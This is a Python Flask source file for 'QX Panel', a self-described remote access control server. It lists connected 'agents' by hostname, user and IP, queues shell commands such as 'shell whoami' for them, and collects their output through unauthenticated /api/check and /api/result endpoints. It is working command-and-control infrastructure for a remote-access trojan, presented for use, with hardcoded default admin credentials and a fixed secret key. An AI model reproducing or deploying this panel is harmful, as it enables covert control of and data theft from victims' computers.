from flask import Flask, request, render_template_string, jsonify, redirect, url_for, session
import time
import os
import json
import secrets
import string
from datetime import datetime

app = Flask(__name__)
app.secret_key = "qx_secret_key_change_this_987"

USERS_FILE = "users.json"
AGENTS_FILE = "agents.json"
SETTINGS_FILE = "settings.json"

def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r") as f:
                return json.load(f)
        except:
            pass
    return default

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

users = load_json(USERS_FILE, {"admin": "admin123"})
agents = load_json(AGENTS_FILE, {})
# settings: { username: { "bg": "particles" | "url...", } }
settings = load_json(SETTINGS_FILE, {})
commands = {}
results = {}

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QX Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #030306;
            color: #e4e4e7;
            min-height: 100vh;
            overflow-x: hidden;
        }
        {% if bg_url %}
        body {
            background: url('{{ bg_url }}') center/cover no-repeat fixed;
        }
        body::before {
            content: '';
            position: fixed; inset: 0;
            background: rgba(3,3,6,0.72);
            z-index: 0;
        }
        {% endif %}
        #particles {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 0; pointer-events: none;
            display: {% if bg_url %}none{% else %}block{% endif %};
        }
        .container {
            position: relative; z-index: 1;
            max-width: 920px; margin: 0 auto;
            padding: 40px 24px 60px;
        }
        .header { text-align: center; margin-bottom: 40px; }
        .header h1 {
            font-size: 34px; font-weight: 700; letter-spacing: -1px;
            background: linear-gradient(135deg, #00e5ff, #0077ff);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
        }
        .header p { color: #a1a1aa; font-size: 13px; }
        .card {
            background: rgba(16, 16, 24, 0.82);
            border: 1px solid rgba(255,255,255,0.07);
            border-radius: 18px; padding: 24px; margin-bottom: 18px;
            backdrop-filter: blur(16px);
        }
        .card h3 {
            font-size: 11px; font-weight: 600; text-transform: uppercase;
            letter-spacing: 1.2px; color: #71717a; margin-bottom: 16px;
        }
        .agent {
            display: flex; align-items: center; justify-content: space-between;
            padding: 14px 16px; background: rgba(255,255,255,0.03);
            border-radius: 12px; margin-bottom: 8px;
        }
        .agent-name { font-weight: 600; font-size: 14px; color: #f4f4f5; }
        .agent-meta { font-size: 12px; color: #71717a; margin-top: 3px; }
        .status {
            display: flex; align-items: center; gap: 7px;
            font-size: 11px; font-weight: 600;
            padding: 5px 12px; border-radius: 20px;
        }
        .status.online { background: rgba(0,255,157,0.12); color: #00ff9d; }
        .status.offline { background: rgba(255,70,70,0.12); color: #ff5555; }
        .status-dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; }
        .status.online .status-dot { animation: pulse 1.6s ease infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.35; } }
        .form-group { margin-bottom: 12px; }
        input, select {
            width: 100%; padding: 13px 16px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 12px; color: #f4f4f5;
            font-size: 14px; font-family: inherit; outline: none;
        }
        input:focus, select:focus {
            border-color: rgba(0,212,255,0.45);
            box-shadow: 0 0 0 3px rgba(0,212,255,0.1);
        }
        select option { background: #12121a; }
        button {
            width: 100%; padding: 13px;
            background: linear-gradient(135deg, #00e5ff, #0077ff);
            color: #030306; font-size: 14px; font-weight: 600;
            border: none; border-radius: 12px; cursor: pointer;
            font-family: inherit;
        }
        button:hover { opacity: 0.92; }
        .btn-secondary {
            background: rgba(255,255,255,0.08);
            color: #d4d4d8; margin-top: 8px;
        }
        pre {
            background: rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 10px; padding: 13px 15px;
            font-size: 12.5px; line-height: 1.55; color: #d4d4d8;
            white-space: pre-wrap; word-break: break-all; margin-bottom: 10px;
        }
        .empty { color: #52525b; font-size: 13px; text-align: center; padding: 18px 0; }
        .login-wrap { max-width: 380px; margin: 100px auto 0; }
        .login-wrap h2 { text-align: center; font-size: 24px; margin-bottom: 28px; color: #f4f4f5; }
        .top-bar {
            display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px;
        }
        .top-bar .user { font-size: 13px; color: #a1a1aa; }
        .top-bar a { color: #71717a; font-size: 13px; text-decoration: none; }
        .top-bar a:hover { color: #00e5ff; }
        .generated {
            margin-top: 12px; padding: 12px;
            background: rgba(0,255,157,0.08); border-radius: 10px;
            font-size: 13px; color: #00ff9d;
        }
        .user-list { margin-top: 12px; font-size: 13px; color: #a1a1aa; }
        .user-list span {
            display: inline-block; background: rgba(255,255,255,0.06);
            padding: 4px 10px; border-radius: 8px; margin: 3px;
        }
        .row-btns { display: flex; gap: 10px; }
        .row-btns button { flex: 1; }
    </style>
</head>
<body>
    <canvas id="particles"></canvas>
    <div class="container">

        {% if not session.get('logged_in') %}
        <div class="login-wrap">
            <div class="card">
                <h2>QX Panel</h2>
                <form method="POST" action="/login">
                    <div class="form-group">
                        <input type="text" name="username" placeholder="Username" required autofocus>
                    </div>
                    <div class="form-group">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit">Login</button>
                </form>
            </div>
        </div>

        {% else %}
        <div class="header">
            <h1>QX Panel</h1>
            <p>Remote Access Control</p>
        </div>

        <div class="top-bar">
            <span class="user">Logged in as <b>{{ session.get('username') }}</b></span>
            <a href="/logout">Logout</a>
        </div>

        <!-- Background settings -->
        <div class="card">
            <h3>Background</h3>
            <form method="POST" action="/set_bg">
                <div class="form-group">
                    <input type="text" name="bg_url" placeholder="Image URL (leave empty for particles)" value="{{ bg_url or '' }}">
                </div>
                <div class="row-btns">
                    <button type="submit">Save Background</button>
                    <button type="submit" name="reset" value="1" class="btn-secondary">Reset to Particles</button>
                </div>
            </form>
        </div>

        <!-- Agents -->
        <div class="card">
            <h3>Agents</h3>
            {% if agents %}
                {% for aid, info in agents.items() %}
                <div class="agent">
                    <div>
                        <div class="agent-name">{{ info.hostname }}</div>
                        <div class="agent-meta">{{ info.user }} · {{ info.ip }} · {{ info.last_seen_str }}</div>
                    </div>
                    <div class="status {{ 'online' if (now - info.last_seen) < 35 else 'offline' }}">
                        <span class="status-dot"></span>
                        {{ 'ONLINE' if (now - info.last_seen) < 35 else 'OFFLINE' }}
                    </div>
                </div>
                {% endfor %}
            {% else %}
                <p class="empty">No agents connected</p>
            {% endif %}
        </div>

        <!-- Send Command -->
        <div class="card">
            <h3>Send Command</h3>
            <form method="POST" action="/send">
                <div class="form-group">
                    <select name="agent_id">
                        {% for aid, info in agents.items() %}
                        <option value="{{ aid }}">{{ info.hostname }} — {{ info.user }}</option>
                        {% endfor %}
                    </select>
                </div>
                <div class="form-group">
                    <input type="text" name="cmd" placeholder="info · shell whoami · shell dir · ss ..." required autocomplete="off">
                </div>
                <button type="submit">Send Command</button>
            </form>
        </div>

        <!-- Results -->
        <div class="card">
            <h3>Results</h3>
            {% if results %}
                {% for aid, res_list in results.items() %}
                    <div style="margin-bottom:14px;">
                        <div style="font-size:12px;color:#71717a;margin-bottom:6px;">{{ agents[aid].hostname if aid in agents else aid }}</div>
                        {% for r in res_list[-5:] %}
                        <pre>{{ r }}</pre>
                        {% endfor %}
                    </div>
                {% endfor %}
            {% else %}
                <p class="empty">No results yet</p>
            {% endif %}
        </div>

        {% if session.get('username') == 'admin' %}
        <div class="card">
            <h3>Admin — Create Account</h3>
            <form method="POST" action="/create_user">
                <div class="form-group">
                    <input type="text" name="new_username" placeholder="New username" required>
                </div>
                <button type="submit">Generate Account</button>
            </form>
            {% if generated %}
            <div class="generated">
                Username: <b>{{ generated.username }}</b><br>
                Password: <b>{{ generated.password }}</b>
            </div>
            {% endif %}
            <div class="user-list">
                Existing users:
                {% for u in users.keys() %}
                <span>{{ u }}</span>
                {% endfor %}
            </div>
        </div>
        {% endif %}

        {% endif %}
    </div>

    <script>
        const canvas = document.getElementById('particles');
        if (canvas && canvas.style.display !== 'none') {
            const ctx = canvas.getContext('2d');
            let particles = [];
            function resize() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }
            window.addEventListener('resize', resize);
            resize();
            class Particle {
                constructor() {
                    this.x = Math.random() * canvas.width;
                    this.y = Math.random() * canvas.height;
                    this.size = Math.random() * 1.8 + 0.4;
                    this.speedX = (Math.random() - 0.5) * 0.35;
                    this.speedY = (Math.random() - 0.5) * 0.35;
                    this.opacity = Math.random() * 0.4 + 0.1;
                }
                update() {
                    this.x += this.speedX;
                    this.y += this.speedY;
                    if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
                    if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
                }
                draw() {
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                    ctx.fillStyle = `rgba(0, 200, 255, ${this.opacity})`;
                    ctx.fill();
                }
            }
            for (let i = 0; i < 55; i++) particles.push(new Particle());
            function animate() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                particles.forEach(p => { p.update(); p.draw(); });
                requestAnimationFrame(animate);
            }
            animate();
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    global agents
    agents = load_json(AGENTS_FILE, agents)
    now = time.time()
    for aid, info in list(agents.items()):
        if "last_seen" in info:
            agents[aid]["last_seen_str"] = datetime.fromtimestamp(info["last_seen"]).strftime("%H:%M:%S")
        else:
            agents[aid]["last_seen_str"] = "?"
            agents[aid]["last_seen"] = 0

    username = session.get("username", "")
    user_settings = settings.get(username, {})
    bg_url = user_settings.get("bg", "")
    if bg_url == "particles":
        bg_url = ""

    generated = session.pop("generated", None)
    return render_template_string(HTML, agents=agents, results=results, now=now,
                                  session=session, users=users, generated=generated, bg_url=bg_url)

@app.route("/login", methods=["POST"])
def login():
    global users
    users = load_json(USERS_FILE, {"admin": "admin123"})
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")
    if username in users and users[username] == password:
        session["logged_in"] = True
        session["username"] = username
    return redirect(url_for("index"))

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

@app.route("/send", methods=["POST"])
def send():
    if not session.get("logged_in"):
        return redirect(url_for("index"))
    aid = request.form.get("agent_id")
    cmd = request.form.get("cmd", "").strip()
    if aid and cmd:
        commands[aid] = cmd
    return redirect(url_for("index"))

@app.route("/set_bg", methods=["POST"])
def set_bg():
    global settings
    if not session.get("logged_in"):
        return redirect(url_for("index"))
    username = session.get("username")
    settings = load_json(SETTINGS_FILE, {})
    if username not in settings:
        settings[username] = {}

    if request.form.get("reset"):
        settings[username]["bg"] = "particles"
    else:
        url = request.form.get("bg_url", "").strip()
        settings[username]["bg"] = url if url else "particles"

    save_json(SETTINGS_FILE, settings)
    return redirect(url_for("index"))

@app.route("/create_user", methods=["POST"])
def create_user():
    global users
    if not session.get("logged_in") or session.get("username") != "admin":
        return redirect(url_for("index"))
    users = load_json(USERS_FILE, {"admin": "admin123"})
    new_username = request.form.get("new_username", "").strip().lower()
    if new_username and new_username not in users:
        alphabet = string.ascii_letters + string.digits
        password = ''.join(secrets.choice(alphabet) for _ in range(12))
        users[new_username] = password
        save_json(USERS_FILE, users)
        session["generated"] = {"username": new_username, "password": password}
    return redirect(url_for("index"))

@app.route("/api/check", methods=["POST"])
def api_check():
    global agents
    data = request.json or {}
    aid = data.get("id")
    if not aid:
        return jsonify({"cmd": None})
    agents[aid] = {
        "hostname": data.get("hostname", "?"),
        "user": data.get("user", "?"),
        "ip": data.get("ip", "?"),
        "last_seen": time.time()
    }
    save_json(AGENTS_FILE, agents)
    cmd = commands.pop(aid, None)
    return jsonify({"cmd": cmd})

@app.route("/api/result", methods=["POST"])
def api_result():
    data = request.json or {}
    aid = data.get("id")
    result = data.get("result", "")
    if not aid:
        return jsonify({"ok": False})
    if aid not in results:
        results[aid] = []
    results[aid].append(f"[{datetime.now().strftime('%H:%M:%S')}] {result}")
    results[aid] = results[aid][-12:]
    return jsonify({"ok": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
